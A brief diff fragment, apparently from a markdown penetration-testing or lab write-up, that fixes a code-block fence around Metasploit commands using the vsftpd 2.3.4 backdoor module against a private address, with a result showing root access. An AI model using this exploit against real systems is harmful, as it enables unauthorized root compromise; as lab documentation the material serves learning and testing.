@@ -8,7 +8,7 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOST 192.168.1.3
 run
 whoami
-id
+id```
 
 **Result:** uid=0(root)
 
